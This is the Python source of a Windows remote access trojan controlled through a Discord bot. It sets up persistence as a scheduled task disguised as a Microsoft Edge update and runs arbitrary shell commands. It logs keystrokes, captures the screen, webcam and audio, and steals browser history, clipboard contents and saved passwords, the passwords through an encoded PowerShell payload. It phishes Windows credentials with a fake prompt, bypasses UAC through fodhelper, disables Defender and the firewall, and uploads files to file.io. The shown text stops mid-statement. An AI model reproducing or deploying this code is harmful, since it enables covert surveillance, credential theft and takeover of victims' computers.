# -*- coding: utf-8 -*-
import win32con
import win32gui
import win32cred
import win32api
import win32crypt
import win32com.client
import requests
import inspect
import ctypes
import ctypes.wintypes
import sys
import os
import ssl
import threading
import time
import cv2
import subprocess
import asyncio
import json
import logging
import platform
import urllib.request
import discord
import pyautogui
import re
import sqlite3
import shutil
import browser_cookie3
import pywintypes
import io
import shutil
import sounddevice as sd
import numpy as np  
import win32com.client as wincl
from dotenv import load_dotenv
from discord.ext import commands
from requests import get
from pynput.keyboard import Key, Controller, Listener
from scipy.io.wavfile import write
from ctypes import *
from mss import mss
from lazagne.config import run

load_dotenv()
CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
token = os.environ.get("DISCORD_TOKEN")
global isexe
isexe=False
if (sys.argv[0].endswith("exe")):
    isexe=True
global appdata
global temp
appdata = os.getenv('APPDATA')
temp= os.getenv('temp')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context

async def activity(client):
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    create_persistence()
    total = []
    global number
    number = 1
    global channel_name
    channel_name = None
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    for x in client.get_all_channels():
        if x.name.startswith("session"):
            messages = await x.history(oldest_first=True, limit=10).flatten()
            ip_pattern = re.compile("(?<=IP:\s)\S*")
            ip_match = ip_pattern.search(messages[0].content)
            if ip_match and ip_match.group(0) == ip:
                channel_name = x.name
        total.append(x.name)
    if channel_name is None:
        for y in range(len(total)):
            if total[y].startswith("session"):
                result = [e for e in re.split("[^0-9]", total[y]) if e != '']
                biggest = max(map(int, result))
                number = biggest + 1
            else:
                pass
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()} | IP: {ip}"
    if is_admin == True:
        await channel.send(f'{value1} | admin!')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

def create_persistence():
    current_file_path = sys.argv[0]
    current_filename = os.path.basename(current_file_path)
    appdata_path = os.getenv('APPDATA')
    destination_path = appdata_path + "\..\Local\Packages\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe7fc2\AC\Temp"
    if not os.path.isdir(destination_path):
        os.makedirs(destination_path, exist_ok=True)
    destination_file_path = destination_path + "\\" + current_filename
    if not os.path.isfile(destination_file_path):
        shutil.copy(current_file_path, destination_path)

    computer_name = "" #leave all blank for current computer, current user
    computer_username = ""
    computer_userdomain = ""
    computer_password = ""
    action_id = "MicrosoftEdgeUpdateTaskMachineUA2" #arbitrary action ID
    action_path = destination_file_path #executable path (could be python.exe)
    action_arguments = r'' #arguments (could be something.py)
    action_workdir = r"c:\windows\system32" #working directory for action executable
    author = "" #so that end users know who you are
    description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."
    task_id = "MicrosoftEdgeUpdateTaskMachineUA2"
    task_hidden = False #set this to True to hide the task in the interface

    #define constants
    TASK_TRIGGER_LOGON = 9
    TASK_CREATE_OR_UPDATE = 6
    TASK_ACTION_EXEC = 0
    TASK_LOGON_INTERACTIVE_TOKEN = 3

    #connect to the scheduler (Vista/Server 2008 and above only)
    scheduler = win32com.client.Dispatch("Schedule.Service")
    scheduler.Connect(computer_name or None, computer_username or None, computer_userdomain or None, computer_password or None)
    rootFolder = scheduler.GetFolder("\\")

    #(re)define the task
    taskDef = scheduler.NewTask(0)
    colTriggers = taskDef.Triggers

    trigger = colTriggers.Create(TASK_TRIGGER_LOGON)
    trigger.Id = "LogonTriggerId"
    trigger.UserId = os.environ.get('USERNAME') # current user account
    #trigger.Enabled = False

    colActions = taskDef.Actions
    action = colActions.Create(TASK_ACTION_EXEC)
    action.ID = action_id
    action.Path = action_path
    action.WorkingDirectory = action_workdir
    action.Arguments = action_arguments

    info = taskDef.RegistrationInfo
    info.Author = author
    info.Description = description

    settings = taskDef.Settings
    #settings.Enabled = False
    settings.Hidden = task_hidden
    #settings.StartWhenAvailable = True

    #register the task (create or update, just keep the task name the same)
    result = rootFolder.RegisterTaskDefinition(task_id, taskDef, TASK_CREATE_OR_UPDATE, "", "", TASK_LOGON_INTERACTIVE_TOKEN)

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)
        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
            except:
                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")

        if message.content == "!dumpkeylogger":
            temp = os.getenv("TEMP")
            file_keys = temp + r"\key_log.txt"
            file = discord.File(file_keys, filename="key_log.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(file_keys)

        if message.content == "!exit":
            sys.exit()

        if message.content == "!windowstart":
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!screenshot":
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
            path = (os.getenv('TEMP')) + r"\monitor.png"
            file = discord.File((path), filename="monitor.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(path)

        if message.content == "!webcampic":
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            #time.sleep(0.1)
            return_value, image = camera.read()
            cv2.imwrite(temp + r"\temp.png", image)
            del(camera)
            file = discord.File(temp + r"\temp.png", filename="temp.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
        if message.content.startswith("!message"):
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            def get_all_hwnd(hwnd,mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)

        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] Command successfuly executed")

        if message.content.startswith("!shell"):
            global status
            status = None
            instruction = message.content[7:]
            def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
            out = shell(instruction)
            print(out)
            print(status)
            if status:
                numb = len(out)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(out)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                    os.remove(temp + r"\output.txt")
                else:
                    await message.channel.send("[*] Command successfuly executed : " + out)
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                status = None

        if message.content.startswith("!download"):
            filename=message.content[10:]
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                await message.channel.send("download link: " + response)
                await message.channel.send("[*] Command successfuly executed")
            else:
                file = discord.File(message.content[10:], filename=message.content[10:])
                await message.channel.send("[*] Command successfuly executed", file=file)

        if message.content.startswith("!cd"):
            os.chdir(message.content[4:])
            await message.channel.send("[*] Command successfuly executed")

        if message.content == "!help":
            temp = (os.getenv('TEMP'))
            f5 = open(temp + r"\helpmenu.txt", 'a')
            f5.write(str(helpmenu))
            f5.close()
            temp = (os.getenv('TEMP'))
            file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(temp + r"\helpmenu.txt")

        if message.content.startswith("!write"):
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])

        if message.content == "!history":
            temp = (os.getenv('TEMP'))
            Username = (os.getenv('USERNAME'))
            shutil.rmtree(temp + r"\history12", ignore_errors=True)
            os.mkdir(temp + r"\history12")
            path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
            path_new = temp + r"\history12"
            copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
            os.system(copy_me_to_here)
            con = sqlite3.connect(path_new + r"\history")
            cursor = con.cursor()
            cursor.execute("SELECT url FROM urls")
            urls = cursor.fetchall()
            for x in urls:
                done = ("".join(x))
                f4 = open(temp + r"\history12" + r"\history.txt", 'a')
                f4.write(str(done))
                f4.write(str("\n"))
                f4.close()
            con.close()
            file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            def deleteme() :
                path = "rmdir " + temp + r"\history12" + " /s /q"
                os.system(path)
            deleteme()
        if message.content == "!clipboard":
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))

        if message.content == "!sysinfo":
            jak = str(platform.uname())
            intro = jak[12:]
            ip = get('https://api.ipify.org').text
            pp = "IP Address = " + ip
            await message.channel.send("[*] Command successfuly executed : " + intro + pp)

        if message.content == "!geolocate":
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Command successfuly executed : " + link)

        if message.content == "!admincheck":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")

        if message.content == "!uacbypass":
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                await message.channel.send("Your already admin!")
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                await message.channel.send("attempting to get admin!")
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
                os.system(remove_reg)
        if message.content == "!startkeylogger":
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfuly started")

        if message.content == "!stopkeylogger":
            test._running = False
            await message.channel.send("[*] Keylogger successfuly stopped")

        if message.content.startswith("!voice"):
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])

            await  message.channel.send("[*] Command successfuly executed")

        if message.content == "!passwords" :
            temp= os.getenv('temp')
            def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
            passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
            f4 = open(temp + r"\passwords.txt", 'w')
            f4.write(str(passwords))
            f4.close()
            file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(temp + r"\passwords.txt")
        if message.content == "!streamwebcam" :
            await message.channel.send("[*] Command successfuly executed")
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            running = message.content
            file = temp + r"\hobo\hello.txt"
            if os.path.isfile(file):
                delelelee = "del " + file + r" /f"
                os.system(delelelee)
                os.system(r"RMDIR %temp%\hobo /s /q")
            while True:
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\temp.png", image)
                boom = discord.File(temp + r"\temp.png", filename="temp.png")
                kool = await message.channel.send(file=boom)
                temp = (os.getenv('TEMP'))
                file = temp + r"\hobo\hello.txt"
                if os.path.isfile(file):
                    del camera
                    break
                else:
                    continue
        if message.content == "!stopwebcam":  
            os.system(r"mkdir %temp%\hobo")
            os.system(r"echo hello>%temp%\hobo\hello.txt")
            os.system(r"del %temp\temp.png /F")
        if message.content == "!streamscreen" :
            await message.channel.send("[*] Command successfuly executed")
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\hobos\hellos.txt"        
            if os.path.isfile(hellos):
                os.system(r"del %temp%\hobos\hellos.txt /f")
                os.system(r"RMDIR %temp%\hobos /s /q")      
            else:
                pass
            while True:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                path = (os.getenv('TEMP')) + r"\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await message.channel.send(file=file)
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\hobos\hellos.txt"
                if os.path.isfile(hellos):
                    break
                else:
                    continue
                    
        if message.content == "!stopscreen":  
            os.system(r"mkdir %temp%\hobos")
            os.system(r"echo hello>%temp%\hobos\hellos.txt")
            os.system(r"del %temp%\monitor.png /F")
            
        if message.content == "!shutdown":
            os.system("shutdown /p")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!restart":
            os.system("shutdown /r /t 00")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!logoff":
            os.system("shutdown /l /f")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!currentdir":
            output = subprocess.getoutput('cd')
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("output is : " + output)
            
        if message.content == "!displaydir":
            output = subprocess.getoutput('dir')
            if output:
                result = output
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output22.txt"):
                        os.system(r"del %temp%\output22.txt /f")
                    f1 = open(temp + r"\output22.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output22.txt", filename="output22.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)  
            
        if message.content == "!listprocess":
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)           
        if message.content.startswith("!prockill"):  
            proc = message.content[10:]
            kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
            os.system(kilproc)
            time.sleep(2)
            process_name = proc
            call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
            output = subprocess.check_output(call).decode()
            last_line = output.strip().split('\r\n')[-1]
            done = (last_line.lower().startswith(process_name.lower()))
            if done == False:
                await message.channel.send("[*] Command successfuly executed")
            elif done == True:
                await message.channel.send('[*] Command did not exucute properly') 
        if message.content.startswith("!recscreen"):
            reclenth = float(message.content[10:])
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                if input3 >= reclenth:
                    break
                else:
                    continue
            SCREEN_SIZE = (1920, 1080)
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            temp = (os.getenv('TEMP'))
            videeoo = temp + r"\output.avi"
            out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
            counter = 1
            while True:
                counter = counter + 1
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
                if counter >= input2:
                    break
            out.release()
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.avi"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.avi /f")
            else:
                file = discord.File(check, filename="output.avi")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.avi /f")
        if message.content.startswith("!reccam"):
            input1 = float(message.content[8:])
            temp = (os.getenv('TEMP'))
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            loco = temp + r"\output.mp4"
            output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                ret,frame = vid_capture.read()
                output.write(frame)
                if input3 >= input1:
                    break
                else:
                    continue
            vid_capture.release()
            output.release()
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.mp4"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.mp4 /f")
            else:
                file = discord.File(check, filename="output.mp4")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.mp4 /f")
        if message.content.startswith("!recaudio"):
            seconds = float(message.content[10:])
            temp = (os.getenv('TEMP'))
            fs = 44100
            laco = temp + r"\output.wav"
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(laco, fs, myrecording)
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.wav"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.wav /f")
            else:
                file = discord.File(check, filename="output.wav")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.wav /f")
        if message.content.startswith("!delete"):
            global statue
            instruction = message.content[8:]
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                numb = len(result)
                if numb > 0:
                    await message.channel.send("[*] an error has occurred")
                else:
                    await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                statue = None
        if message.content == "!disableantivirus":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:            
                instruction = """ REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437'))
                done = result.split()
                boom = done[2:]
                if boom <= ['17763']:
                    os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                    await message.channel.send("[*] Command successfuly executed")
                elif boom >= ['18362']:
                    os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                    await message.channel.send("[*] Command successfuly executed")
                else:
                    await message.channel.send("[*] An unknown error has occurred")     
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!disablefirewall":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(r"NetSh Advfirewall set allprofiles state off")
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        #if adding startup n stuff this needs to be edited to that
        if message.content == "!selfdestruct":
            current_file_path = sys.argv[0]
            appdata_path = os.getenv('APPDATA')
            destination_path = appdata_path + "\..\Local\Packages\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe7fc2"
            cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
            hello = os.getpid()
            bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " &" + " del " + '"' + current_file_path + '"' + r" /F" + " &" + " @RD /S /Q " + '"' + destination_path + '"' + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
            temp = (os.getenv("TEMP"))
            temp5 = temp + r"\delete.bat"
            if os.path.isfile(temp5):
                delelee = "del " + temp5 + r" /f"
                os.system(delelee)                
            f5 = open(temp + r"\delete.bat", 'a')
            f5.write(bat)
            f5.close()
            os.system(r"start /min %temp%\delete.bat")
        if message.content == "!windowspass":
            CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials
            creds = []
            try:
                creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
            except Exception:
                pass
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("password user typed in is: " + creds)
            """
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
            instruction = full_cmd
            def shell():   
               output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               return output
            result = str(shell().stdout.decode('CP437'))
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("password user typed in is: " + result)
            """
        if message.content == "!displayoff":
